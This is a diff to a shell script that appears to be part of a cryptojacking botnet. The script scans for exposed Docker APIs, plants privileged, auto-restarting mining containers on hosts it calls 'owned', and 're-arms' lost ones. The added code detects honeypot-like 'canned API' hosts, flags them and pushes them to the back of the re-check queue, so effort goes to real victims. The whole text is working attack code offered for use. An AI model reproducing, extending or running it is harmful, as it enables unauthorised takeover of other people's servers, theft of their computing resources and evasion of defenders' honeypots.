@@ -69,6 +69,7 @@ REARM_MAX="${E_RMAX:-${DOCK_REARM_MAX:-150}}"   # re-checks per run (rotates)
 FRESH_RES="${E_FRES:-${DOCK_FRESH_RESERVE:-40}}"   # % of MAX kept for the fresh pass
 REARM_CAP=$(( MAX * (100 - FRESH_RES) / 100 ))
 if [ "$REARM_CAP" -lt 1 ]; then REARM_CAP=1; fi
+MOCK_RECHECK="${E_MOCKR:-${DOCK_MOCK_RECHECK:-10}}"   # flagged hosts re-checked per run
 SEEN="$WORK/dock.seen"            # daemon found here
 TRIED="$WORK/dock.tried"          # scanned, nothing (ts \t ip)
 OWNFILE="$WORK/dock.owned"        # endpoints we put a container on
@@ -87,6 +88,8 @@ awk -F'\t' 'NF > 1 && $2 !~ /shodan/ {
         print $1 "\t" p
     }' "$WORK/mass.found" 2>/dev/null | tr -d '\r' | sort -u > "$PORTMAP" 2>/dev/null || :
 touch "$RAMFILE"
+MOCKFILE="$WORK/dock.mock"   # acks create/start but holds no real container (canned API)
+touch "$MOCKFILE"
 NOW=$(date +%s)
 
 [ -n "${WALLET:-}" ] || { echo "dock: WALLET unset"; exit 0; }
@@ -104,12 +107,25 @@ HOSTS="$WORK/dockhosts.$$"
     | tr -d '\r' | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | sort -u > "$HOSTS"
 
 # Re-arm rows, built before the fresh queue so healing is never starved by the
-# cap. Everything we own, every run; plus the head of the rotating ledger.
+# cap. Every real host we own, every run; plus the head of the rotating ledger.
+# Canned-API hosts are "owned" too but never really run, so re-checking all of them
+# every run is waste - they are verified on a slow rotation instead.
 REARM_LIST="$WORK/rearm.$$"
 : > "$REARM_LIST"
 if [ "$REARM" = yes ]; then
-    { cut -f1 "$OWNFILE" 2>/dev/null || :; } \
-        | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' >> "$REARM_LIST" || :
+    if [ -s "$MOCKFILE" ]; then
+        { cut -f1 "$OWNFILE" 2>/dev/null || :; } \
+            | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' \
+            | grep -vxF -f "$MOCKFILE" >> "$REARM_LIST" || :
+        head -n "$MOCK_RECHECK" "$MOCKFILE" 2>/dev/null >> "$REARM_LIST" || :
+        # rotate MOCKFILE left by MOCK_RECHECK so the rest come round next runs
+        tail -n +$((MOCK_RECHECK + 1)) "$MOCKFILE" > "$MOCKFILE.n" 2>/dev/null || :
+        head -n "$MOCK_RECHECK" "$MOCKFILE" >> "$MOCKFILE.n" 2>/dev/null || :
+        mv -f "$MOCKFILE.n" "$MOCKFILE" 2>/dev/null || :
+    else
+        { cut -f1 "$OWNFILE" 2>/dev/null || :; } \
+            | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' >> "$REARM_LIST" || :
+    fi
     head -n "$REARM_MAX" "$LEDGER" 2>/dev/null >> "$REARM_LIST" || :
 fi
 sort -u "$REARM_LIST" -o "$REARM_LIST" 2>/dev/null || :
@@ -163,6 +179,25 @@ endpoint() {
         case "$v" in *ApiVersion*) printf '%s|%s\n' "$b" "$o"; return 0 ;; esac
     done
     return 1
+}
+
+# Canned-API detection. A slice of this population ACKs create+start and then holds
+# nothing: the id route 404s, the name never appears in the list, and it mines zero
+# (verified live on a 64 vCPU/503 GB box). Flag it so the re-arm budget stops paying.
+mockcheck() {
+    mip=$1; mid=$2; mname=$3
+    [ -n "$mid" ] || return 0
+    mc=$(curl -sS $opts -o /dev/null -w '%{http_code}' -m 6 "$b/containers/$mid/json" 2>/dev/null) || mc=000
+    if [ "$mc" = 404 ]; then
+        ml=$(curl -sS $opts --max-time 6 "$b/containers/json?all=1" 2>/dev/null) || ml=""
+        if printf '%s' "$ml" | grep -q "/$mname\""; then :; else
+            if grep -qxF "$mip" "$MOCKFILE" 2>/dev/null; then :; else
+                printf '%s\n' "$mip" >> "$MOCKFILE"
+                echo "dock: $mip acked but nothing exists (canned API) - flagged"
+            fi
+        fi
+    fi
+    return 0
 }
 
 dock_one() {
@@ -284,6 +319,8 @@ dock_one() {
                   "$b/containers/$cid/start" 2>/dev/null) || err="curl failed"
         if [ -z "$err" ]; then
             printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
+            # A real engine lets us read the container back by id; a canned one does not.
+            mockcheck "$ip" "$cid" "$name"
             echo "dock: DEPLOYED $name -> $ip (restart=always)"
         else
             # a second attempt as boring as possible: SYS_ADMIN, host ipc and
@@ -300,8 +337,10 @@ dock_one() {
                            "$b/containers/${id2:-$name}/start" 2>/dev/null) || err2="curl failed"
                 if [ -z "$err2" ]; then
                     printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
+                    mockcheck "$ip" "${id2:-$name}" "$name"
                     echo "dock: DEPLOYED $name -> $ip (plain, restart=always)"
                 else
+                    mockcheck "$ip" "${id2:-$name}" "$name"
                     echo "dock: plain start also said: $(printf '%s' "$err2" | head -c 150)"
                 fi
             else
@@ -373,12 +412,20 @@ if [ "$REARM" = yes ]; then
             "$RAMFILE" "$WORK/lg.$$" 2>/dev/null | sort -rn | cut -f2 > "$WORK/lg3.$$" &&
             mv -f "$WORK/lg3.$$" "$WORK/lg.$$" || :
     fi
+    # Canned-API hosts never really run anything, so keep them at the very tail: the
+    # re-check budget belongs to machines that can produce a share.
+    if [ -s "$MOCKFILE" ]; then
+        sort -u "$MOCKFILE" -o "$MOCKFILE" 2>/dev/null || :
+        grep -vxF -f "$MOCKFILE" "$WORK/lg.$$" > "$WORK/lg4.$$" 2>/dev/null || :
+        grep -xF -f "$MOCKFILE" "$WORK/lg.$$" >> "$WORK/lg4.$$" 2>/dev/null || :
+        mv -f "$WORK/lg4.$$" "$WORK/lg.$$" 2>/dev/null || :
+    fi
     tail -n +$((REARM_MAX + 1)) "$WORK/lg.$$" > "$WORK/lg2.$$" 2>/dev/null || :
     head -n "$REARM_MAX" "$WORK/lg.$$" >> "$WORK/lg2.$$" 2>/dev/null || :
     mv -f "$WORK/lg2.$$" "$LEDGER" 2>/dev/null || cp -f "$WORK/lg2.$$" "$LEDGER"
-    rm -f "$WORK/own.$$" "$WORK/lg.$$" "$WORK/lg2.$$" "$WORK/lg3.$$"
+    rm -f "$WORK/own.$$" "$WORK/lg.$$" "$WORK/lg2.$$" "$WORK/lg3.$$" "$WORK/lg4.$$"
 fi
 owned_now=$(wc -l < "$OWNFILE")
 echo "dock: scanned $n (fresh ${fresh_scanned:-0}), daemons known $(wc -l < "$SEEN"), placed $owned_now (+$((owned_now - owned_before)) new, $rearm_n re-verified)"
-echo "dock: re-arm ledger holds $(wc -l < "$LEDGER") known-but-lost host(s)"
+echo "dock: re-arm ledger holds $(wc -l < "$LEDGER") known-but-lost host(s), mock-flagged $(wc -l < "$MOCKFILE")"
 
